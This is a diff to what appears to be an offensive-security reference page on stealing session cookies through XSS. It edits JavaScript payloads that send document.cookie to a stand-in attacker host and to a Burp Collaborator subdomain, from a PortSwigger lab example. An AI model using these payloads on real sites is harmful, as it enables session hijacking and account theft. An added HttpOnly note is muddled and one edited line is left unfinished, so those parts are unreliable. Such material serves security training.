@@ -3,10 +3,14 @@ Stealing cookies is a traditional way to exploit XSS as most web applications us
 - Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
 - Sessions might be locked to additional factors like the user's IP address.
 - The session might time out before you're able to hijack it.
+> Note: Make sure that `HttpOnly` is set to false before attempting this attack, otherwise, it will not work. This is because the `HttpOnly` flag helps mitigate the risk of client side scripting from accessing the protected cookies.
 ## XSS Payloads
+An attacker can start their own server using 
+
+submit the following payloads:
 ```javascript
 document.location='http://ATTACKER-IP/index.php?c='+document.cookie;
-new Image().src='http://ATTACKER-IP/index.php?c='+document.cookie;
+new Image().src='http://ATTACKER-IP/index.php?c='+btoa(document.cookie);
 ```
 ## Example from PortSwigger Academy
 1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
@@ -17,7 +21,7 @@ new Image().src='http://ATTACKER-IP/index.php?c='+document.cookie;
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
 mode: 'no-cors',
-body:document.cookie
+body: document.cookie
 });
 </script>
 ```
